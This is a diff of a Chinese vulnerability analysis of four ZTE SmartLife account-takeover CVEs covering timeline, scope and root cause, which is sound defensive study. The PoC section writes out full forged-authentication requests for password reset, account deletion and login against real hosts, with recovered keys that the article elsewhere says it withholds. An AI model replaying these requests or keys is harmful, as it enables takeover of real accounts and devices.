@@ -22,9 +22,9 @@ source: "gelusus/wxvl 公众号漏洞文库"
 ## 一、先看问题：四个编号与一次同日修订  
 ### 1.1 编号体系与厂商自任 CNA  
   
-四条记录的分配机构字段都是 zte  
+四条记录的分配机构字段都是 zte  
 ，机构标识 6786b568，含义是这批编号由厂商自己受理、自己评分、自己发布，MITRE 侧只做登记。这不影响编号的有效性，但决定了一件事：**围绕这些漏洞的每一句官方表述，来源只有一个。**  
- 第三方能独立复核的只有厂商写下的文字，不能复核这些文字背后的判断过程。  
+ 第三方能独立复核的只有厂商写下的文字，不能复核这些文字背后的判断过程。  
   
 四条记录的预留时间都落在 2026-09-08 02:55:56.712，四者处于同一毫秒，说明这批编号是一次性申请下来的，申请日期在厂商称「已完全修复」之后五天。  
 ### 1.2 四条评分与弱点编号  
@@ -39,12 +39,12 @@ source: "gelusus/wxvl 公众号漏洞文库"
 ### 1.3 时间线与窗口期  
 <table><thead><tr style="box-sizing: border-box;"><th data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">时间</span></section></th><th data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf="">事件</span></section></th></tr></thead><tbody><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-05-18</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">技术报告经邮件正文提交厂商 PSIRT，含五个问题与请求示例</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-06-01</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">厂商要求改用官方模板，当日提交</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-06-12</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">附件投递失败后重发，厂商确认收到</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-07-16</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">按厂商要求补交应用认证重建细节与逐项证明</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-08-12</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">厂商确认发现并提供 CVSS 向量</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-08-19</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2.8.4 上架 Google Play</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-08-21</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2.8.4 上架 App Store</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-09-03</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">厂商称已完全修复</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-09-08</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">四条编号的预留时间，四者落在同一毫秒</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-09-20</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">四条编号陆续发布</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-09-20</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">PoC 仓库创建</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-09-21</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">CISA 侧富化写入</span></span></section></td></tr><tr style="box-sizing: border-box;"><td data-colwidth="158" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">2026-09-21</span></span></section></td><td data-colwidth="341" style="box-sizing: border-box;border: 1px solid rgb(233, 233, 231);padding: 6px 12px;"><section><span leaf=""><span textstyle="" style="font-size: 14px;">NVD 侧末次更新</span></span></section></td></tr></tbody></table>  
 窗口期算出来是五段。报告到首个修复包上架 93 天，报告到厂商称已修复 108 天，报告到编号发布 125 天。编号预留到发布 12 天，**编号末条发布到 PoC 公开 9 小时 57 分。**  
- 前四段的时间点只有一个来源即报告人自述，第五段的两个端点分别来自 CVE 记录与仓库接口元数据，可以独立复核。需要一并注明的是，报告人称整个协调过程一共往来了 50 封邮件，这个数字同样只有单来源。  
+ 前四段的时间点只有一个来源即报告人自述，第五段的两个端点分别来自 CVE 记录与仓库接口元数据，可以独立复核。需要一并注明的是，报告人称整个协调过程一共往来了 50 封邮件，这个数字同样只有单来源。  
 ### 1.4 在野状态的三层写法  
   
 厂商侧的四条记录里都没有在野利用的表述，exploited  
- 字段并不出现。CISA 已知被利用漏洞目录（KEV）未收录这四条编号，顺带核实的一个事实是在 2026-09-21 版本的 KEV 全量目录里，厂商项目字段为 ZTE 的记录是零条。CISA 侧漏洞富化在 2026-09-21 18 时 05 分至 18 时 10 分写入。四条全部标 Exploitation: none  
- 与 Automatable: no  
+ 字段并不出现。CISA 已知被利用漏洞目录（KEV）未收录这四条编号，顺带核实的一个事实是在 2026-09-21 版本的 KEV 全量目录里，厂商项目字段为 ZTE 的记录是零条。CISA 侧漏洞富化在 2026-09-21 18 时 05 分至 18 时 10 分写入。四条全部标 Exploitation: none  
+ 与 Automatable: no  
 ，技术影响一条标 total、三条标 partial。  
   
 这三者不冲突，但不能合并成一句话。需要指出的是富化写入的时间戳晚于 PoC 公开约 23 小时，也就是说这份判定是在完整 PoC 已经躺在公开仓库里之后写下的。该字段对「PoC 已公开」这一情形的取值口径，公开信息未说明，本条只作观察记录，不作结论。  
@@ -53,12 +53,12 @@ EPSS 方面，86553 为 0.00446，百分位 0.38035，取值日期 2026-09-21，
 ## 二、影响范围：版本号、修复层与分发渠道  
 ### 2.1 客户端版本号是不是修复判据  
   
-四条记录的受影响字段写的是 ZTE_SL_V2.8.2_ABROAD and prior versions  
+四条记录的受影响字段写的是 ZTE_SL_V2.8.2_ABROAD and prior versions  
 ，86555 一条则写作 and earlier versions。两者含义相同而写法不同，可以反推出四条记录在撰写时并非共用同一段文本。  
   
 **修复版本在编号记录里是空的。**  
- 有聚合站给出 ZTE_SL_V2.8.4_ABROAD  
- 为修复版本。我核了四条 CNA 容器的全部字段，里面没有修复版本字段，也没有 datePublic 与 timeline，因此这个值只有聚合站一个来源。  
+ 有聚合站给出 ZTE_SL_V2.8.4_ABROAD  
+ 为修复版本。我核了四条 CNA 容器的全部字段，里面没有修复版本字段，也没有 datePublic 与 timeline，因此这个值只有聚合站一个来源。  
   
 应用商店侧的公开数据是这样的。Google Play 当前版本 2.8.4，更新日期 2026 年 8 月 19 日，版本说明只有一句 Fixed known issues。App Store 版本历史显示 2.8.4 发布于 2026 年 8 月 21 日，说明文字是 Resolve existing issues。两处与「修复版本为 2.8.4」的说法自洽。  
   
@@ -73,9 +73,9 @@ EPSS 方面，86553 为 0.00446，百分位 0.38035，取值日期 2026-09-21，
 两条渠道相隔两天，都落在厂商称「已完全修复」的 2026-09-03 之前，顺序是修复包先上架、厂商后确认修复完成、编号再晚 17 天发布。  
 ### 2.4 平台边界在编号记录里是空的  
   
-受影响字段用的是跨平台的版本串 ZTE_SL_V2.8.2_ABROAD  
-，没有区分 Android 与 iOS。而报告人的客户端取证对象只有一个，即 Android 包 com.zte.smarthome.abroad  
- 2.8.1。iOS 客户端是否也以同样方式从公开引导接口派生应用认证材料，公开信息未说明，自查时不要因为编号串不区分平台就假定两端行为一致。  
+受影响字段用的是跨平台的版本串 ZTE_SL_V2.8.2_ABROAD  
+，没有区分 Android 与 iOS。而报告人的客户端取证对象只有一个，即 Android 包 com.zte.smarthome.abroad  
+ 2.8.1。iOS 客户端是否也以同样方式从公开引导接口派生应用认证材料，公开信息未说明，自查时不要因为编号串不区分平台就假定两端行为一致。  
 ### 2.5 版本表述与修复版本之间的空档  
   
 能确认的是「2.8.2 及更早受影响」这一句，它出自厂商；「2.8.4 是修复边界」出自聚合站。这两句不要拼成一句当成官方结论，因为中间那段空档在编号记录里没有对应的文字。  
@@ -95,7 +95,7 @@ EPSS 方面，86553 为 0.00446，百分位 0.38035，取值日期 2026-09-21，
 研究者写下的根因是重置路径根本没有要求重置验证码，缺失的那一步校验就是缺陷本身。厂商在编号记录里的原文是，攻击者拿到应用认证参数后可以直接调用验证接口取得注册邮箱对应的真实账号 ID，再通过伪造应用认证信息加目标账号 ID 重置目标账号密码。  
   
 对照下来，厂商描述了「怎么做到」，没有说「少了哪一步」，**「缺少重置验证码校验」这一根因主张只有研究者一个来源。**  
- 这一点在自查里很关键，因为它决定排查范围：按厂商描述读，这是一次身份伪造加接口滥用，要看的是签名校验与接口权限；按研究者主张读，这是一处缺失的流程校验，要看的是密码重置流程的状态机。两者指向不同的检查项。  
+ 这一点在自查里很关键，因为它决定排查范围：按厂商描述读，这是一次身份伪造加接口滥用，要看的是签名校验与接口权限；按研究者主张读，这是一处缺失的流程校验，要看的是密码重置流程的状态机。两者指向不同的检查项。  
   
 另需注明一段文字。聚合站页面上有一段以 Solution 为标题的处置建议，内容包含对密码重置功能实施限速等五条。而我核了四条 CNA 容器的字段清单，里面没有 solutions 字段。该段文字的归属，公开信息未说明，不得读成厂商的根因认定。  
 ### 3.4 公开引导接口为什么是可用的  
@@ -111,7 +111,7 @@ EPSS 方面，86553 为 0.00446，百分位 0.38035，取值日期 2026-09-21，
 、/account/password/reset.serv  
 、/account/delete.serv  
 、/auth/login.serv  
- 都出现在厂商原文里。**接口名与调用顺序是可核的**  
+ 都出现在厂商原文里。**接口名与调用顺序是可核的**  
 ，返回码对照与账号后置条件则只有报告人一个来源。  
   
 报告人给出的返回码对照是未注册邮箱返回 0004、已注册邮箱返回 0000 并附带后端账号标识；第 4 步的对照是旧密码被拒、新密码返回会话。这些数值在公开材料里没有第二份记录，它们构成文章结论的最薄一层支撑。  
@@ -120,7 +120,7 @@ EPSS 方面，86553 为 0.00446，百分位 0.38035，取值日期 2026-09-21，
 删除接口在报告人早期选到的环境上无需用户令牌即可删除账号，厂商称该行为仅存在于测试环境、生产路径需要令牌，报告人接受了这一说明，四条编号不含这一项。报告人记录的负向复测正是在这个接口上，在现网主机上返回 3001，令牌校验失败。  
   
 这一条被排除是合理的，但要注意它在整份材料里的位置：**这是全文唯一一处「修补之后的行为被复核过」的记录，而它落在被排除的那一项上。**  
- 其余四项在材料里只有正向复现的记录，没有负向复核的记录，因此「现在还能不能走通」这个问题，公开材料没有给出答案。  
+ 其余四项在材料里只有正向复现的记录，没有负向复核的记录，因此「现在还能不能走通」这个问题，公开材料没有给出答案。  
 ### 4.3 公开的密钥材料与它的失效边界  
   
 报告人公开了四类密钥参数的完整值，理由是全部端点已修补且密钥材料已由厂商轮换，本文不复制这些值。失效边界要拆开说：客户端里的解密密钥与对称密钥随新版本移除，这一步可核；而请求签名所用的共享密钥与接入密钥属于服务端一侧，它们的失效依赖服务端轮换，外部只能通过一件事验证，就是拿旧材料重放请求看是否被拒。  
@@ -130,8 +130,8 @@ EPSS 方面，86553 为 0.00446，百分位 0.38035，取值日期 2026-09-21，
 能确认的只有材料已经公开这一事实，「材料已经失效」这一判断只有一个来源，而该来源的可核路径在公开材料里是空的。本文因此选择不转载这些值，理由不是对报告人的判断提出质疑，而是这条判断的可核路径缺失。一旦服务端并未轮换，复制它们等于在本号的一次转发里再分发一份可能仍然有效的凭据，而本号的运作方式正是转发。任何人拿到这份材料能不能再构造出可用的应用认证，公开信息未说明。  
 ### 4.4 编号之外还有一类密钥材料  
   
-报告人在同一段说明里列出的第四项，是静态分析在 APK 中发现的相机双向 TLS 私钥，它位于 res/raw/smartlife_key  
-。这份私钥与同目录下的客户端证书匹配，证书签发者为 ZTE-CAMERA-CA  
+报告人在同一段说明里列出的第四项，是静态分析在 APK 中发现的相机双向 TLS 私钥，它位于 res/raw/smartlife_key  
+。这份私钥与同目录下的客户端证书匹配，证书签发者为 ZTE-CAMERA-CA  
 ，用于摄像头与消息队列通信。这一项**不在四个编号里，也没有对应的厂商公告**  
 ，公开信息未说明厂商是否受理、是否轮换、是否认为它需要单独编号。  
   
@@ -141,7 +141,7 @@ EPSS 方面，86553 为 0.00446，百分位 0.38035，取值日期 2026-09-21，
 报告人从 APK 里列出的路由族分成四组。账号会话在 Homecare 软件开发包（SDK）中作为 bearer 凭据使用，同组请求还带一个标记调用方为 SmartLife 的字段。第一组是家庭、房间与已绑定设备清单；第二组是设备绑定与解绑、绑定状态查询、设备分享与取消分享、家庭成员接受；第三组是云到设备的消息转发与一键升级的发起和结果查询；第四组是摄像头、传感器、子用户、用户日志与安防设防相关接口。  
   
 这一段的性质要说明白：**路由清单证明的是登录之后这扇门后面有多少东西，不证明这些接口本身存在缺陷。**  
- 报告人明确把这一步标为静态分析所列出的可见面，而不是已经验证的缺陷。把账号会话写进一个能下发设备指令与固件升级动作的平面上，是这条链的后果放大器，账号接管在这个产品上不是一次资料修改，而是一次设备控制权的前置条件。  
+ 报告人明确把这一步标为静态分析所列出的可见面，而不是已经验证的缺陷。把账号会话写进一个能下发设备指令与固件升级动作的平面上，是这条链的后果放大器，账号接管在这个产品上不是一次资料修改，而是一次设备控制权的前置条件。  
 ### 4.6 报告方的两种验证方法各自证明了什么  
   
 方法一是直放，用恢复出的应用认证上下文对报告人自己的对照账号跑一遍账号生命周期，落点是返回码与账号后置条件，它证明的是链路可以走通。方法二是 Frida 运行期观测，附着到官方客户端进程，记录它在运行期选中的后端主机以及进程内生成签名头的路径。它证明的是现网客户端确实在选这个后端并在本地算出签名，报告人称这一步的价值在于压缩了「你测的是测试环境」这类质疑空间。两种方法的运行环境是带 root 的 Android 12 模拟器，静态分析工具是 jadx，脚本语言是 PowerShell 7。  
@@ -156,22 +156,22 @@ Bug 1. 通过公共引导程序伪造 SmartLife 应用身份验证
 POST /api/getUacSignInfo HTTP/1.1
 Host: ossx-smart.ztehome.com.cn:5443
 Content-Type: application/json
- 
+ 
 {
-  "clientid":"271950143414",
-  "appDistrict":"DE"
+  "clientid":"271950143414",
+  "appDistrict":"DE"
 }
- 
+ 
 // Decrypt result.data with static APK key (CVE-2026-86555):
 decrypt(result.data, key="096760a7a99d99d12de9fecbfca568c0")
- 
+ 
 // Yields recovered UAC context:
-// appClientKey: "djrom(&)(&)MORJD"
-// appUacSec:    "b2cfe28732612cfd81de7a22ace2034317a47eb94683a016a85cc0883597c625"
-// appUacItp:    "271950143414fnu4mb3lxxotfj5mi1tp"
- 
+// appClientKey: "djrom(&)(&)MORJD"
+// appUacSec:    "b2cfe28732612cfd81de7a22ace2034317a47eb94683a016a85cc0883597c625"
+// appUacItp:    "271950143414fnu4mb3lxxotfj5mi1tp"
+ 
 derived account headers:
-X-App-Id:    271950143414
+X-App-Id:    271950143414
 X-Tenant-Id: 10001
 X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
 X-Auth-Value: aes_gcm_encrypt("${appUacSec},271950143414,${appUacItp},${ms}", key="djrom(&)(&)MORJD")
@@ -188,16 +188,16 @@ Host: zxuacde.smart-zte.com
 X-App-Id: 271950143414
 X-Tenant-Id: 10001
 X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
-X-Auth-Value: <fresh AES-GCM token encrypted with"djrom(&)(&)MORJD">
+X-Auth-Value: <fresh AES-GCM token encrypted with"djrom(&)(&)MORJD">
 X-Lang-Id: en_US
 Content-Type: application/json
- 
+ 
 {
-  "key": "<aes_gcm_encrypt(email, key="djrom(&)(&)MORJD")>"
+  "key": "<aes_gcm_encrypt(email, key="djrom(&)(&)MORJD")>"
 }
- 
-registered   -> code=0000 + accountId
-unregistered -> code=0004
+ 
+registered   -> code=0000 + accountId
+unregistered -> code=0004
 ```  
   
 > 弱点：目标电子邮件使用恢复的客户端密钥进行加密djrom(&amp;)(&amp;)MORJD。该端点充当注册帐户预言机，并在成功路径中泄露后端帐户标识符（CVE-2026-86554）。  
@@ -211,14 +211,14 @@ Host: zxuacde.smart-zte.com
 X-App-Id: 271950143414
 X-Tenant-Id: 10001
 X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
-X-Auth-Value: <fresh AES-GCM token encrypted with"djrom(&)(&)MORJD">
+X-Auth-Value: <fresh AES-GCM token encrypted with"djrom(&)(&)MORJD">
 X-Lang-Id: en_US
 Content-Type: application/json
- 
+ 
 {
-  "accountId":"A<target accountId>",
-  "newPassword":"<attacker-selected password>"
-  // noreset code, no old password, no bound reset transaction
+  "accountId":"A<target accountId>",
+  "newPassword":"<attacker-selected password>"
+  // noreset code, no old password, no bound reset transaction
 }
 ```  
   
@@ -233,14 +233,14 @@ Host: uactest.ztems.com
 X-App-Id: 271950143414
 X-Tenant-Id: 10001
 X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
-X-Auth-Value: <fresh AES-GCM token encrypted with"djrom(&)(&)MORJD">
+X-Auth-Value: <fresh AES-GCM token encrypted with"djrom(&)(&)MORJD">
 X-Emp-No: A<target accountId>
 X-Lang-Id: en_US
 Content-Type: application/json
- 
+ 
 {
-  "accountId":"A<target accountId>"
-  // no user Bearer token in the validated earlier-path behavior
+  "accountId":"A<target accountId>"
+  // no user Bearer token in the validated earlier-path behavior
 }
 ```  
   
@@ -255,15 +255,15 @@ Host: zxuacde.smart-zte.com
 X-App-Id: 271950143414
 X-Tenant-Id: 10001
 X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
-X-Auth-Value: <fresh AES-GCM token encrypted with"djrom(&)(&)MORJD">
+X-Auth-Value: <fresh AES-GCM token encrypted with"djrom(&)(&)MORJD">
 X-Lang-Id: en_US
 Content-Type: application/json
- 
+ 
 {
-  "email":"<arbitrary victim identity>",
-  "password":"<chosen password>",
-  "countryCode":"DE",
-  "mailboxOwnership":"not yet proven"
+  "email":"<arbitrary victim identity>",
+  "password":"<chosen password>",
+  "countryCode":"DE",
+  "mailboxOwnership":"not yet proven"
 }
 ```  
   
@@ -278,16 +278,16 @@ Host: zxuacde.smart-zte.com
 X-App-Id: 271950143414
 X-Tenant-Id: 10001
 X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
-X-Auth-Value: <fresh AES-GCM token encrypted with"djrom(&)(&)MORJD">
+X-Auth-Value: <fresh AES-GCM token encrypted with"djrom(&)(&)MORJD">
 X-Lang-Id: en_US
 Content-Type: application/json
- 
+ 
 {
-  "loginName": "<aes_gcm_encrypt(email, key="djrom(&)(&)MORJD")>",
-  "passWord": "<aes_gcm_encrypt(newPassword, key="djrom(&)(&)MORJD")>",
-  "loginSystemCode":"271950143414",
-  "loginClientIp":"127.0.0.1",
-  "verifyCode":"<sha256_hex(loginName + passWord + ip + systemCode)>"
+  "loginName": "<aes_gcm_encrypt(email, key="djrom(&)(&)MORJD")>",
+  "passWord": "<aes_gcm_encrypt(newPassword, key="djrom(&)(&)MORJD")>",
+  "loginSystemCode":"271950143414",
+  "loginClientIp":"127.0.0.1",
+  "verifyCode":"<sha256_hex(loginName + passWord + ip + systemCode)>"
 }
 ```  
   
@@ -320,7 +320,7 @@ https://support.zte.com.cn/zte-iccp-isupport-webui/bulletin/detail/8745058661590
 ZTE PSIRT 响应流程与服务承诺
 https://www.zte.com.cn/global/about/trust-center/ztepsirt.html
 
-CVE.org 记录（CNA 为 ZTE Corporation）
+CVE.org 记录（CNA 为 ZTE Corporation）
 https://www.cve.org/CVERecord?id=CVE-2026-86552
 
 NVD 记录接口
@@ -329,7 +329,7 @@ https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2026-86553
 CVE 记录初版与提交历史（5.1 与 5.2 两节的依据）
 https://github.com/CVEProject/cvelistV5/commits/main/cves/2026/86xxx/CVE-2026-86553.json
 
-CISA KEV 全量目录（2026-09-21 版本，1,717 条，ZTE 条目为零）
+CISA KEV 全量目录（2026-09-21 版本，1,717 条，ZTE 条目为零）
 https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json
 
 EPSS公开接口（CVE-2026-86553，取值日期2026-09-21）
@@ -356,11 +356,11 @@ cvefeed.io、cve.circl.lu、byteos.network、dbu.gs、cvetodo.com、techgeeks.or
 ![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0G3BIEHLsL2SLv0Rc302U6lD45p86IrmJickdThYm45ox2qPwS4ibCxGURU2UaEp2g1lps22icyjgYx12lVYAcMKUOxicffyUD85ick/640?wx_fmt=jpeg&from=appmsg "")  
   
   
-公众号内容都来自国外等平台- 搜索的内容通过结合编写 -   
+公众号内容都来自国外等平台- 搜索的内容通过结合编写 -   
   
 三方单独接广被举报 - 没收入广告已开  
   
-公众号 |   
+公众号 |   
 AnQuan7 (Ots安全)  
   
 
